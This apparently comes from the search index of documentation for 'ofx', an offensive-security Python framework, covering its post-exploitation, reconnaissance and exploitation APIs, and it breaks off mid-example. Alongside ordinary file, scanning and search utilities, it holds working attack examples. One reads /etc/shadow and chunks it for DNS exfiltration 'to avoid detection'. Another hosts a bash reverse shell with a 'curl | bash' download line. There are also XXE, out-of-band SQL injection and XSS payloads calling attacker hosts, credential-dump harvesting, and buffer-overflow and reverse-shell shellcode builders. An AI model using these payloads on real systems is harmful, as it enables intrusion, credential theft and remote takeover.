write_file","text":"<p>Simple file I/O operations.</p> <p>Reading Files:</p> <pre><code>from ofx.api.file import read_file\n\n# Read text file\ncontent = read_file('config.txt')\nprint(content)\n\n# Read with Path object\nfrom pathlib import Path\ncontent = read_file(Path('/etc/passwd'))\n\n# Error handling\ntry:\n    content = read_file('nonexistent.txt')\nexcept FileNotFoundError as e:\n    print(f\"File not found: {e}\")\n</code></pre> <p>Writing Files:</p> <pre><code>from ofx.api.file import write_file\n\n# Write string to file (creates directories automatically)\nwrite_file('Hello World', 'output/test.txt')\n\n# Write configuration\nconfig = \"\"\"\n[database]\nhost = localhost\nport = 3306\n\"\"\"\nwrite_file(config, 'config/database.ini')\n\n# Write with Path object\nfrom pathlib import Path\nwrite_file('data', Path('/tmp/output.txt'))\n</code></pre> <p>Practical Examples:</p> <pre><code># Download and save file\nfrom ofx.api.http import requests\nfrom ofx.api.file import write_file\n\nresponse = requests.get('https://example.com/data.json')\nwrite_file(response.text, 'downloads/data.json')\n\n# Process and save\nfrom ofx.api.file import read_file, write_file\n\n# Read input\ndata = read_file('input.txt')\n\n# Process\nprocessed = data.upper().replace('OLD', 'NEW')\n\n# Save output\nwrite_file(processed, 'output.txt')\n\n# Log results\nresults = []\nfor target in targets:\n    result = scan(target)\n    results.append(f\"{target}: {result}\")\n\nwrite_file('\\n'.join(results), 'scan_results.txt')\n</code></pre>"},{"location":"api/post-exploitation/#string-utilities","title":"String Utilities","text":""},{"location":"api/post-exploitation/#remove_duplicate_string","title":"remove_duplicate_string","text":"<p>Remove duplicates from string lists while preserving order.</p> <pre><code>from ofx.api.strings import remove_duplicate_string\n\n# Remove duplicates\nurls = [\n    'http://example.com',\n    'http://test.com',\n    'http://example.com',  # Duplicate\n    'http://demo.com'\n]\n\nunique_urls = remove_duplicate_string(urls)\n# Result: ['http://example.com', 'http://test.com', 'http://demo.com']\n\n# Use in workflows\ntargets = ['192.168.1.1', '10.0.0.1', '192.168.1.1']\nunique_targets = remove_duplicate_string(targets)\n</code></pre>"},{"location":"api/post-exploitation/#general-utilities","title":"General Utilities","text":""},{"location":"api/post-exploitation/#url2ip","title":"url2ip","text":"<p>Convert URLs to IP addresses with port extraction.</p> <pre><code>from ofx.api.utils import url2ip\n\n# Basic conversion\nip = url2ip('http://example.com')\nprint(ip)  # '93.184.216.34'\n\n# With port extraction\nip, port = url2ip('https://example.com:8443', with_port=True)\nprint(f\"{ip}:{port}\")  # '93.184.216.34:8443'\n\n# Default port handling\nip, port = url2ip('http://example.com', with_port=True)\n# Result: ('93.184.216.34', 80)\n\nip, port = url2ip('https://secure.example.com', with_port=True)\n# Result: ('93.184.216.34', 443)\n</code></pre> <p>Practical Use:</p> <pre><code># Scan URLs by IP\nfrom ofx.api.utils import url2ip\nfrom ofx.api.network import PortScanner\n\nurls = [\n    'http://site1.com',\n    'https://site2.com:8443',\n    'http://site3.com:8080'\n]\n\nscanner = PortScanner()\nfor url in urls:\n    ip, port = url2ip(url, with_port=True)\n    print(f\"Scanning {url} ({ip}:{port})\")\n    results = scanner.scan(ip, ports=[port])\n    print(results)\n</code></pre>"},{"location":"api/post-exploitation/#str_to_dict","title":"str_to_dict","text":"<p>Parse string representations of dictionaries.</p> <pre><code>from ofx.api.utils import str_to_dict\n\n# Parse string to dict\nconfig_str = \"{'host': 'localhost', 'port': 3306, 'timeout': 30}\"\nconfig = str_to_dict(config_str)\n\nprint(config['host'])    # 'localhost'\nprint(config['port'])    # 3306\nprint(config['timeout']) # 30\n\n# Use in workflow parsing\nsettings_str = \"{'debug': True, 'log_level': 'INFO'}\"\nsettings = str_to_dict(settings_str)\nif settings['debug']:\n    print(\"Debug mode enabled\")\n</code></pre>"},{"location":"api/post-exploitation/#generate_random_user_agent","title":"generate_random_user_agent","text":"<p>Generate realistic user agent strings.</p> <pre><code>from ofx.api.utils import generate_random_user_agent\n\n# Generate random user agent\nua = generate_random_user_agent()\nprint(ua)\n# 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...'\n\n# Use in HTTP requests\nfrom ofx.api.http import requests\n\nheaders = {'User-Agent': generate_random_user_agent()}\nresponse = requests.get('https://example.com', headers=headers)\n\n# Generate multiple for rotation\nuser_agents = [generate_random_user_agent() for _ in range(10)]\n</code></pre> <p>Practical Example:</p> <pre><code># Rotate user agents for scraping\nfrom ofx.api.http import requests\nfrom ofx.api.utils import generate_random_user_agent\nimport time\n\nurls = ['http://site1.com', 'http://site2.com', 'http://site3.com']\n\nfor url in urls:\n    headers = {'User-Agent': generate_random_user_agent()}\n    response = requests.get(url, headers=headers)\n    print(f\"{url}: {response.status_code}\")\n    time.sleep(1)  # Rate limiting\n</code></pre>"},{"location":"api/post-exploitation/#workflow-integration","title":"Workflow Integration","text":""},{"location":"api/post-exploitation/#file-processing-workflow","title":"File Processing Workflow","text":"<pre><code>name: Log Analysis\n\ninputs:\n  log_file:\n    required: true\n  pattern:\n    required: true\n\njobs:\n  analyze:\n    steps:\n      - name: Read Log File\n        script: |\n          from ofx.api.file import read_file\n\n          content = read_file('{{ inputs.log_file }}')\n          lines = content.split('\\n')\n          print(f\"total_lines={len(lines)}\")\n        outputs:\n          total_lines: \"{{ step.total_lines }}\"\n\n      - name: Filter Logs\n        script: |\n          from ofx.api.file import read_file\n          import re\n\n          content = read_file('{{ inputs.log_file }}')\n          pattern = r'{{ inputs.pattern }}'\n\n          matches = []\n          for line in content.split('\\n'):\n              if re.search(pattern, line):\n                  matches.append(line)\n\n          print(f\"matches={len(matches)}\")\n          result = '\\n'.join(matches)\n          print(f\"filtered_content={result}\")\n        outputs:\n          matches: \"{{ step.matches }}\"\n          filtered_content: \"{{ step.filtered_content }}\"\n\n      - name: Save Results\n        script: |\n          from ofx.api.file import write_file\n\n          content = '''{{ steps.1.outputs.filtered_content }}'''\n          write_file(content, 'results/filtered_logs.txt')\n\n          summary = f\"Found {{ steps.1.outputs.matches }} matches\"\n          write_file(summary, 'results/summary.txt')\n</code></pre>"},{"location":"api/post-exploitation/#data-collection-workflow","title":"Data Collection Workflow","text":"<pre><code>name: Target Enumeration\n\ninputs:\n  target_domain:\n    required: true\n\njobs:\n  enumerate:\n    steps:\n      - name: Collect Subdomains\n        script: |\n          from ofx.api.network import SubdomainEnumerator\n          from ofx.api.strings import remove_duplicate_string\n\n          enum = SubdomainEnumerator(domain='{{ inputs.target_domain }}')\n          subdomains = enum.enumerate()\n\n          # Remove duplicates\n          unique = remove_duplicate_string(subdomains)\n\n          print(f\"found={len(unique)}\")\n          print(f\"subdomains={','.join(unique)}\")\n        outputs:\n          subdomains: \"{{ step.subdomains }}\"\n\n      - name: Resolve IPs\n        script: |\n          from ofx.api.utils import url2ip\n          from ofx.api.strings import remove_duplicate_string\n\n          subdomains = \"{{ steps.0.outputs.subdomains }}\".split(',')\n          ips = []\n\n          for subdomain in subdomains:\n              try:\n                  ip = url2ip(f\"http://{subdomain}\")\n                  ips.append(ip)\n              except:\n                  pass\n\n          unique_ips = remove_duplicate_string(ips)\n          print(f\"ips={','.join(unique_ips)}\")\n        outputs:\n          ips: \"{{ step.ips }}\"\n\n      - name: Save Report\n        script: |\n          from ofx.api.file import write_file\n          import json\n\n          report = {\n              'domain': '{{ inputs.target_domain }}',\n              'subdomains': \"{{ steps.0.outputs.subdomains }}\".split(','),\n              'ips': \"{{ steps.1.outputs.ips }}\".split(','),\n              'total_subdomains': len(\"{{ steps.0.outputs.subdomains }}\".split(',')),\n              'total_ips': len(\"{{ steps.1.outputs.ips }}\".split(','))\n          }\n\n          write_file(json.dumps(report, indent=2), 'reports/enumeration.json')\n</code></pre>"},{"location":"api/post-exploitation/#web-scraping-workflow","title":"Web Scraping Workflow","text":"<pre><code>name: Web Content Scraper\n\ninputs:\n  urls:\n    description: \"Comma-separated URLs\"\n    required: true\n\njobs:\n  scrape:\n    steps:\n      - name: Download Pages\n        script: |\n          from ofx.api.http import requests\n          from ofx.api.utils import generate_random_user_agent\n          from ofx.api.file import write_file\n          import time\n\n          urls = \"{{ inputs.urls }}\".split(',')\n\n          for i, url in enumerate(urls):\n              headers = {'User-Agent': generate_random_user_agent()}\n              try:\n                  response = requests.get(url.strip(), headers=headers)\n                  filename = f'downloads/page_{i}.html'\n                  write_file(response.text, filename)\n                  print(f\"Downloaded: {url}\")\n              except Exception as e:\n                  print(f\"Failed {url}: {e}\")\n\n              time.sleep(2)  # Rate limiting\n\n      - name: Extract Titles\n        script: |\n          from ofx.api.file import read_file\n          from pathlib import Path\n          import re\n\n          titles = []\n          for html_file in Path('downloads').glob('*.html'):\n              content = read_file(html_file)\n              match = re.search(r'&lt;title&gt;(.*?)&lt;/title&gt;', content)\n              if match:\n                  titles.append(match.group(1))\n\n          print(f\"titles={','.join(titles)}\")\n        outputs:\n          titles: \"{{ step.titles }}\"\n\n      - name: Generate Report\n        script: |\n          from ofx.api.file import write_file\n\n          urls = \"{{ inputs.urls }}\".split(',')\n          titles = \"{{ steps.1.outputs.titles }}\".split(',')\n\n          report = \"# Web Scraping Report\\n\\n\"\n          for url, title in zip(urls, titles):\n              report += f\"- [{title}]({url})\\n\"\n\n          write_file(report, 'reports/scraping_report.md')\n</code></pre>"},{"location":"api/post-exploitation/#practical-examples","title":"Practical Examples","text":""},{"location":"api/post-exploitation/#credential-harvesting","title":"Credential Harvesting","text":"<pre><code>from ofx.api.file import read_file, write_file\nfrom ofx.api.strings import remove_duplicate_string\nimport re\n\n# Read dumped credentials\ndata = read_file('dump.txt')\n\n# Extract emails\nemails = re.findall(r'[\\w\\.-]+@[\\w\\.-]+\\.\\w+', data)\nunique_emails = remove_duplicate_string(emails)\n\n# Extract IPs\nips = re.findall(r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b', data)\nunique_ips = remove_duplicate_string(ips)\n\n# Extract URLs\nurls = re.findall(r'https?://[^\\s&lt;&gt;\"]+', data)\nunique_urls = remove_duplicate_string(urls)\n\n# Save organized data\nwrite_file('\\n'.join(unique_emails), 'extracted/emails.txt')\nwrite_file('\\n'.join(unique_ips), 'extracted/ips.txt')\nwrite_file('\\n'.join(unique_urls), 'extracted/urls.txt')\n\nprint(f\"Extracted {len(unique_emails)} emails\")\nprint(f\"Extracted {len(unique_ips)} IPs\")\nprint(f\"Extracted {len(unique_urls)} URLs\")\n</code></pre>"},{"location":"api/post-exploitation/#response-analysis","title":"Response Analysis","text":"<pre><code>from ofx.api.http import requests\nfrom ofx.api.file import write_file\nfrom ofx.api.utils import url2ip, generate_random_user_agent\nimport json\n\n# Target URLs\nurls = [\n    'http://admin.example.com',\n    'http://api.example.com',\n    'http://staging.example.com'\n]\n\nresults = []\nfor url in urls:\n    # Randomize user agent\n    headers = {'User-Agent': generate_random_user_agent()}\n\n    try:\n        # Get IP\n        ip = url2ip(url)\n\n        # Fetch page\n        response = requests.get(url, headers=headers, timeout=5)\n\n        # Analyze response\n        result = {\n            'url': url,\n            'ip': ip,\n            'status': response.status_code,\n            'size': len(response.text),\n            'headers': dict(response.headers),\n            'title': extract_title(response.text)\n        }\n\n        results.append(result)\n        print(f\"\u2713 {url} [{response.status_code}]\")\n\n    except Exception as e:\n        print(f\"\u2717 {url} - {e}\")\n        results.append({\n            'url': url,\n            'error': str(e)\n        })\n\n# Save results\nwrite_file(json.dumps(results, indent=2), 'analysis/responses.json')\n\ndef extract_title(html):\n    import re\n    match = re.search(r'&lt;title&gt;(.*?)&lt;/title&gt;', html, re.IGNORECASE)\n    return match.group(1) if match else 'No title'\n</code></pre>"},{"location":"api/post-exploitation/#data-exfiltration-simulation","title":"Data Exfiltration Simulation","text":"<pre><code>from ofx.api.file import read_file, write_file\nfrom ofx.api.http import requests\nimport base64\nimport gzip\n\n# Read sensitive file\ndata = read_file('/etc/shadow')\n\n# Compress\ncompressed = gzip.compress(data.encode())\n\n# Encode\nencoded = base64.b64encode(compressed).decode()\n\n# Split into chunks (avoid detection)\nchunk_size = 100\nchunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]\n\n# Exfiltrate via DNS/HTTP\nfrom ofx.api.oob import CEye\n\nceye = CEye()\nfor i, chunk in enumerate(chunks):\n    # Create unique subdomain with data\n    payload = ceye.build_request(f'chunk{i}', type='dns')\n    # In real scenario, encode chunk in subdomain\n    # dns_query = f\"{chunk}.{payload['url']}\"\n\n    print(f\"Chunk {i}/{len(chunks)} ready for exfiltration\")\n\n# Save for later retrieval\nwrite_file('\\n'.join(chunks), 'exfil/data_chunks.txt')\nprint(f\"Data split into {len(chunks)} chunks\")\n</code></pre>"},{"location":"api/post-exploitation/#see-also","title":"See Also","text":"<ul> <li>Reconnaissance APIs - Search engines, OOB testing, network scanning</li> <li>Exploitation APIs - Shellcode, payloads, webshells</li> <li>Workflow Guide - Using APIs in workflows</li> <li>Template System - Dynamic configuration</li> </ul>"},{"location":"api/reconnaissance/","title":"Reconnaissance APIs","text":"<p>APIs for asset discovery, port scanning, service detection, and OOB testing.</p>"},{"location":"api/reconnaissance/#search-engines","title":"Search Engines","text":""},{"location":"api/reconnaissance/#fofa","title":"Fofa","text":"<p>FOFA (Cyberspace Assets Retrieval) search engine for discovering internet-connected assets.</p> <p>Initialization:</p> <pre><code>from ofx.api.search import Fofa\n\n# Interactive mode (prompts for credentials)\nfofa = Fofa()\n\n# Programmatic mode\nfofa = Fofa(user=\"email@example.com\", token=\"your_api_token\")\n\n# Custom config location\nfofa = Fofa(conf_path=Path(\"/custom/path/config.ini\"))\n</code></pre> <p>Basic Search:</p> <pre><code># Simple search\nresults = fofa.search('title=\"login\"')\n\n# Multi-page search\nresults = fofa.search('app=\"Apache\" &amp;&amp; country=\"US\"', pages=3)\n\n# Search with size limit\nresults = fofa.search('port=3306', size=100)\n\n# Access results\nfor item in results:\n    print(f\"Host: {item['host']}\")\n    print(f\"Port: {item['port']}\")\n    print(f\"Title: {item['title']}\")\n    print(f\"IP: {item['ip']}\")\n</code></pre> <p>Advanced Queries:</p> <pre><code># Multiple conditions\nresults = fofa.search('protocol=\"http\" &amp;&amp; status_code=\"200\" &amp;&amp; country=\"CN\"')\n\n# Version detection\nresults = fofa.search('app=\"Apache\" &amp;&amp; version=\"2.4.41\"')\n\n# Certificate search\nresults = fofa.search('cert=\"example.com\"')\n\n# ASN search\nresults = fofa.search('asn=\"12345\"')\n</code></pre> <p>Practical Examples:</p> <pre><code># Find exposed admin panels\nadmin_panels = fofa.search('title=\"Admin Panel\" || title=\"Dashboard\"', pages=5)\nfor panel in admin_panels:\n    print(f\"Found admin panel: https://{panel['host']}:{panel['port']}\")\n\n# Find specific vulnerabilities\nvulnerable = fofa.search('app=\"Apache Struts\" &amp;&amp; version=\"2.3.15\"')\n\n# Search by organization\ncompany_assets = fofa.search('org=\"Example Corp\"', size=200)\n\n# Export results\nimport json\nwith open('targets.json', 'w') as f:\n    json.dump(results, f, indent=2)\n</code></pre>"},{"location":"api/reconnaissance/#shodan","title":"Shodan","text":"<p>Internet-wide scanning and service detection.</p> <pre><code>from ofx.api.search import Shodan\n\n# Initialize\nshodan = Shodan(api_key=\"your_api_key\")\n\n# Search\nresults = shodan.search('apache')\n\n# Filter by port\nresults = shodan.search('port:22')\n\n# Country-specific\nresults = shodan.search('apache country:\"US\"')\n</code></pre>"},{"location":"api/reconnaissance/#zoomeye","title":"ZoomEye","text":"<p>Cyberspace search engine for comprehensive asset discovery.</p> <pre><code>from ofx.api.search import ZoomEye\n\n# Initialize\nzoomeye = ZoomEye(api_key=\"your_api_key\")\n\n# Web search\nresults = zoomeye.search('app:apache')\n\n# Host search\nresults = zoomeye.search_host('+port:80 +country:cn')\n\n# Domain search\nresults = zoomeye.search_web('site:example.com')\n</code></pre>"},{"location":"api/reconnaissance/#out-of-band-testing","title":"Out-of-Band Testing","text":""},{"location":"api/reconnaissance/#ceye","title":"CEye","text":"<p>Monitor DNS and HTTP callbacks for blind vulnerability detection.</p> <p>Setup:</p> <pre><code>from ofx.api.oob import CEye\n\n# Interactive setup\nceye = CEye()\n\n# Programmatic setup\nceye = CEye(token=\"your_ceye_token\")\n</code></pre> <p>DNS Callbacks:</p> <pre><code># Generate unique DNS subdomain\npayload = ceye.build_request('test_data', type='dns')\ndns_domain = payload['url']  # e.g., \"xxxxx.ceye.io\"\nflag = payload['flag']  # Unique identifier\n\n# Use in exploit (example: command injection)\nexploit = f\"curl http://{dns_domain}\"\n\n# Wait for callback\ntime.sleep(5)\n\n# Verify callback received\nif ceye.verify_request(flag, type='dns'):\n    print(\"DNS callback received - vulnerability confirmed!\")\n    # Get detailed records\n    records = ceye.get_dns_records(filter=flag)\n    for record in records:\n        print(f\"Time: {record['time']}\")\n        print(f\"Query: {record['name']}\")\n</code></pre> <p>HTTP Callbacks:</p> <pre><code># Generate unique HTTP URL\npayload = ceye.build_request('exfil_data', type='http')\nhttp_url = payload['url']  # e.g., \"http://xxxxx.ceye.io\"\n\n# Use in exploit (example: SSRF)\nexploit_payload = {\n    'url': http_url,\n    'data': 'sensitive_info'\n}\n\n# Check for HTTP requests\nif ceye.verify_request(payload['flag'], type='http'):\n    print(\"HTTP callback received!\")\n    records = ceye.get_http_records(filter=payload['flag'])\n    for record in records:\n        print(f\"IP: {record['remote_addr']}\")\n        print(f\"Path: {record['request_uri']}\")\n        print(f\"Headers: {record['headers']}\")\n</code></pre> <p>Practical Examples:</p> <pre><code># XXE Detection\nxxe_payload = ceye.build_request('xxe_test', type='http')\nxml = f'''&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE data [\n  &lt;!ENTITY xxe SYSTEM \"{xxe_payload['url']}\"&gt;\n]&gt;\n&lt;data&gt;&amp;xxe;&lt;/data&gt;'''\n\n# Send XML and verify\n# ... send xml to target ...\nif ceye.verify_request(xxe_payload['flag'], type='http'):\n    print(\"XXE vulnerability confirmed!\")\n\n# SQL Injection OOB\nsqli_payload = ceye.build_request('sqli', type='dns')\nsql = f\"'; EXEC master..xp_dirtree '//{sqli_payload['url']}/a';--\"\n\n# SSRF Detection\nssrf_payload = ceye.build_request('ssrf', type='http')\nif ceye.verify_request(ssrf_payload['flag']):\n    print(\"SSRF vulnerability exists!\")\n</code></pre>"},{"location":"api/reconnaissance/#interactsh","title":"Interactsh","text":"<p>Self-hosted OOB interaction server.</p> <pre><code>from ofx.api.oob import Interactsh\n\n# Initialize\ninteractsh = Interactsh()\n\n# Register a unique identifier\nsession = interactsh.register()\ndomain = session['domain']  # e.g., \"xyz123.interact.sh\"\n\n# Use in payload\npayload = f\"curl http://{domain}\"\n\n# Poll for interactions\ninteractions = interactsh.poll(session['id'])\nfor interaction in interactions:\n    print(f\"Protocol: {interaction['protocol']}\")\n    print(f\"Request: {interaction['raw_request']}\")\n</code></pre>"},{"location":"api/reconnaissance/#network-scanning","title":"Network Scanning","text":""},{"location":"api/reconnaissance/#portscanner","title":"PortScanner","text":"<p>Fast port discovery with service detection.</p> <pre><code>from ofx.api.network import PortScanner\n\n# Initialize\nscanner = PortScanner()\n\n# Scan common ports\nresults = scanner.scan('192.168.1.100', ports=[80, 443, 8080, 3306, 22])\n\n# Scan port range\nresults = scanner.scan('10.0.0.1', ports=range(1, 1024))\n\n# Scan with custom timeout\nresults = scanner.scan('target.com', ports=[80, 443], timeout=2)\n\n# Process results\nfor result in results:\n    if result['status'] == 'open':\n        print(f\"Port {result['port']} is open\")\n        if 'service' in result:\n            print(f\"Service: {result['service']}\")\n</code></pre>"},{"location":"api/reconnaissance/#servicegrabber","title":"ServiceGrabber","text":"<p>Banner grabbing and service detection.</p> <pre><code>from ofx.api.network import ServiceGrabber\n\ngrabber = ServiceGrabber()\n\n# Grab banner\ninfo = grabber.grab('192.168.1.100', 22)\nprint(f\"Banner: {info.get('banner')}\")\nprint(f\"Service: {info.get('service')}\")\n\n# HTTP information\nhttp_info = grabber.grab_http('example.com', 80)\nprint(f\"Server: {http_info.get('server')}\")\nprint(f\"Status: {http_info.get('status_code')}\")\nprint(f\"Title: {http_info.get('title')}\")\n</code></pre>"},{"location":"api/reconnaissance/#dnsresolver","title":"DNSResolver","text":"<p>DNS record enumeration.</p> <pre><code>from ofx.api.network import DNSResolver\n\nresolver = DNSResolver()\n\n# A records\na_records = resolver.query('example.com', record_type='A')\n\n# MX records\nmx_records = resolver.query('example.com', record_type='MX')\n\n# All common records\nall_records = resolver.query_all('example.com')\nfor record_type, records in all_records.items():\n    print(f\"{record_type}: {records}\")\n</code></pre>"},{"location":"api/reconnaissance/#subdomainenumerator","title":"SubdomainEnumerator","text":"<p>Wildcard-aware subdomain discovery.</p> <pre><code>from ofx.api.network import SubdomainEnumerator\n\n# Initialize with wordlist\nenumerator = SubdomainEnumerator(\n    domain='example.com',\n    wordlist='/path/to/subdomains.txt'\n)\n\n# Enumerate subdomains\nsubdomains = enumerator.enumerate()\nfor subdomain in subdomains:\n    print(f\"Found: {subdomain}\")\n\n# Use built-in wordlist\nenumerator = SubdomainEnumerator(domain='example.com')\nenumerator.enumerate(threads=10)\n</code></pre>"},{"location":"api/reconnaissance/#http-server","title":"HTTP Server","text":""},{"location":"api/reconnaissance/#phttpserver","title":"PHTTPServer","text":"<p>Payload hosting with SSL support.</p> <p>Basic Usage:</p> <pre><code>from ofx.api import PHTTPServer\n\n# Simple HTTP server\nserver = PHTTPServer(bind_ip='0.0.0.0', bind_port=8080)\nserver.start(daemon=True)\n\nprint(f\"Server running at: {server.get_url()}\")\n# Server running at: http://192.168.1.100:8080\n\n# Keep server running\nimport time\ntime.sleep(300)  # Run for 5 minutes\nserver.stop()\n</code></pre> <p>HTTPS Server:</p> <pre><code># Generate self-signed certificate\nserver = PHTTPServer(\n    bind_ip='0.0.0.0',\n    bind_port=443,\n    use_https=True\n)\n\n# Start in background\nserver.start(daemon=True)\n\nprint(f\"HTTPS Server: {server.get_url()}\")\n# HTTPS Server: https://192.168.1.100:443\n</code></pre> <p>Custom Directory:</p> <pre><code># Serve from custom directory\nserver = PHTTPServer(\n    bind_ip='0.0.0.0',\n    bind_port=8000,\n    directory='/path/to/payloads'\n)\nserver.start(daemon=True)\n\n# Clients can now access files:\n# http://server-ip:8000/payload.exe\n# http://server-ip:8000/exploit.sh\n</code></pre> <p>Practical Examples:</p> <pre><code># Host reverse shell payload\nfrom pathlib import Path\n\n# Create payload directory\npayload_dir = Path('/tmp/payloads')\npayload_dir.mkdir(exist_ok=True)\n\n# Write reverse shell script\nreverse_shell = '''#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1\n'''\n(payload_dir / 'shell.sh').write_text(reverse_shell)\n\n# Start server\nserver = PHTTPServer(bind_ip='0.0.0.0', bind_port=8080, directory=str(payload_dir))\nserver.start(daemon=True)\n\nprint(f\"Download with: curl {server.get_url()}/shell.sh | bash\")\n\n# IPv6 support\nserver_v6 = PHTTPServer(bind_ip='::', bind_port=8080, ipv6=True)\nserver_v6.start(daemon=True)\n</code></pre> <p>Auto Port Selection:</p> <pre><code># Automatically find available port\nserver = PHTTPServer(bind_ip='0.0.0.0')\nserver.auto_port()  # Finds available port between 8000-9000\nserver.start(daemon=True)\n\nprint(f\"Server started on: {server.get_url()}\")\n</code></pre>"},{"location":"api/reconnaissance/#workflow-integration","title":"Workflow Integration","text":"<p>Comprehensive Recon Workflow:</p> <pre><code>name: Asset Reconnaissance\n\ninputs:\n  target_query:\n    description: \"FOFA search query\"\n    required: true\n  max_targets:\n    description: \"Maximum targets to scan\"\n    default: 50\n\njobs:\n  discover:\n    steps:\n      - name: FOFA Search\n        script: |\n          from ofx.api.search import Fofa\n          fofa = Fofa()\n          results = fofa.search('{{ inputs.target_query }}', size={{ inputs.max_targets }})\n          targets = [r['ip'] for r in results]\n          print(f\"targets={','.join(targets)}\")\n        outputs:\n          targets: \"{{ step.targets }}\"\n\n      - name: Port Scan\n        script: |\n          from ofx.api.network import PortScanner\n          scanner = PortScanner()\n          all_results = []\n          for target in \"{{ steps.0.outputs.targets }}\".split(','):\n              results = scanner.scan(target, ports=[80,443,22,3306])\n              all_results.append({\n                  'host': target,\n                  'open_ports': [r['port'] for r in results if r['status'] == 'open']\n              })\n          print(f\"scan_results={all_results}\")\n        outputs:\n          scan_results: \"{{ step.scan_results }}\"\n\n      - name: Service Detection\n        script: |\n          from ofx.api.network import ServiceGrabber\n          import json\n\n          grabber = ServiceGrabber()\n          scan_results = {{ steps.1.outputs.scan_results }}\n\n          for result in scan_results:\n              for port in result['open_ports']:\n                  info = grabber.grab(result['host'], port)\n                  print(f\"{result['host']}:{port} - {info.get('banner', 'No banner')}\")\n</code></pre> <p>OOB Testing Workflow:</p> <pre><code>name: Blind XXE Detection\n\njobs:\n  test_xxe:\n    steps:\n      - name: Generate OOB Payload\n        script: |\n          from ofx.api.oob import CEye\n          ceye = CEye()\n          payload = ceye.build_request('xxe_test', type='http')\n          xml = f'''&lt;?xml version=\"1.0\"?&gt;\n          &lt;!DOCTYPE data [\n            &lt;!ENTITY xxe SYSTEM \"{payload['url']}/data.txt\"&gt;\n          ]&gt;\n          &lt;data&gt;&amp;xxe;&lt;/data&gt;'''\n          print(f\"payload={payload}\")\n          print(f\"xml={xml}\")\n        outputs:\n          payload: \"{{ step.payload }}\"\n          xml: \"{{ step.xml }}\"\n\n      - name: Send Exploit\n        script: |\n          import requests\n          xml = '''{{ steps.0.outputs.xml }}'''\n          response = requests.post(\n              '{{ inputs.target_url }}',\n              data=xml,\n              headers={'Content-Type': 'application/xml'}\n          )\n\n      - name: Verify Callback\n        script: |\n          import time\n          from ofx.api.oob import CEye\n\n          time.sleep(5)\n          ceye = CEye()\n          payload = {{ steps.0.outputs.payload }}\n\n          if ceye.verify_request(payload['flag'], type='http'):\n              print(\"XXE Vulnerability Confirmed!\")\n              records = ceye.get_http_records(filter=payload['flag'])\n              for record in records:\n                  print(f\"Callback from: {record['remote_addr']}\")\n          else:\n              print(\"No callback received\")\n</code></pre>"},{"location":"api/exploitation/","title":"Exploitation API","text":"<p>Overview of exploitation modules and usage.</p> <ul> <li>Shellcode</li> <li>Webshell</li> <li>HTTP Client</li> </ul>"},{"location":"api/exploitation/exploit/","title":"Exploitation API","text":"<p>Exploitation utilities including generic exploit frameworks and helpers.</p>"},{"location":"api/exploitation/exploit/#module-ofxapiexploit","title":"Module: <code>ofx.api.exploit</code>","text":"<p>Provides generic exploitation utilities and helpers for vulnerability exploitation.</p>"},{"location":"api/exploitation/exploit/#functions","title":"Functions","text":""},{"location":"api/exploitation/exploit/#exploit_format_string","title":"exploit_format_string","text":"<p>Format string vulnerability exploitation helper.</p> <pre><code>from ofx.api.exploit import exploit_format_string\n\n# Find offset\noffset = exploit_format_string.find_offset(\n    target_func=vulnerable_function,\n    start=1,\n    end=100\n)\n\n# Generate payload\npayload = exploit_format_string.generate_payload(\n    offset=offset,\n    target_addr=0xdeadbeef,\n    value=0x41414141\n)\n</code></pre>"},{"location":"api/exploitation/exploit/#exploit_buffer_overflow","title":"exploit_buffer_overflow","text":"<p>Buffer overflow exploitation utilities.</p> <pre><code>from ofx.api.exploit import exploit_buffer_overflow\n\n# Generate pattern\npattern = exploit_buffer_overflow.create_pattern(length=1000)\n\n# Find offset from crash\noffset = exploit_buffer_overflow.find_offset(pattern, \"Aa0Aa1Aa2\")\n\n# Build exploit\nexploit = exploit_buffer_overflow.build_exploit(\n    offset=offset,\n    ret_addr=0x08048484,\n    nop_sled=100,\n    shellcode=shellcode_bytes\n)\n</code></pre>"},{"location":"api/exploitation/exploit/#exploit_rop","title":"exploit_rop","text":"<p>Return-Oriented Programming (ROP) chain builder.</p> <pre><code>from ofx.api.exploit import exploit_rop\n\n# Build ROP chain\nrop_chain = exploit_rop.build_chain([\n    0x08048100,  # pop eax; ret\n    0xdeadbeef,  # value for eax\n    0x08048200,  # pop ebx; ret  \n    0xcafebabe,  # value for ebx\n    0x08048300,  # int 0x80\n])\n</code></pre>"},{"location":"api/exploitation/exploit/#classes","title":"Classes","text":""},{"location":"api/exploitation/exploit/#exploitbuilder","title":"ExploitBuilder","text":"<p>High-level exploit building interface.</p> <pre><code>from ofx.api.exploit import ExploitBuilder\n\nbuilder = ExploitBuilder(target_arch=\"x86\")\n\n# Add components\nbuilder.add_nop_sled(100)\nbuilder.add_shellcode(shellcode_bytes)\nbuilder.add_padding(offset - len(shellcode_bytes) - 100)\nbuilder.add_return_address(0x08048484)\n\n# Generate exploit\nexploit = builder.build()\n</code></pre>"},{"location":"api/exploitation/exploit/#payloadgenerator","title":"PayloadGenerator","text":"<p>Generate common exploit payloads.</p> <pre><code>from ofx.api.exploit import PayloadGenerator\n\ngen = PayloadGenerator()\n\n# SQL injection payloads\nsqli_payloads = gen.generate_sqli(\n    technique=\"union\",\n    columns=5,\n    table=\"users\"\n)\n\n# XSS payloads\nxss_payloads = gen.generate_xss(\n    context=\"html\",\n    callback_url=\"http://attacker.com/xss\"\n)\n\n# Command injection\ncmdi_payloads = gen.generate_command_injection(\n    command=\"whoami\",\n    os=\"linux\"\n)\n</code></pre>"},{"location":"api/exploitation/exploit/#examples","title":"Examples","text":""},{"location":"api/exploitation/exploit/#buffer-overflow-exploitation","title":"Buffer Overflow Exploitation","text":"<pre><code>from ofx.api.exploit import exploit_buffer_overflow\nfrom ofx.api.shellcode import ShellGenerator\n\n# Generate shellcode\nshell_gen = ShellGenerator(\"linux\", \"x64\")\nshellcode, _ = shell_gen.get_shellcode(\n    \"reverse\",\n    connectback_ip=\"10.10.10.1\",\n    connectback_port=4444\n)\n\n# Find offset (from testing)\noffset = 512\n\n# Build exploit\nnop_sled = b\"\\x90\" * 100\npadding = b\"A\" * (offset - len(shellcode) - len(nop_sled))\nret_addr = struct.pack(\"&lt;Q\", 0x7fffffffe000)  # Stack address\n\nexploit = 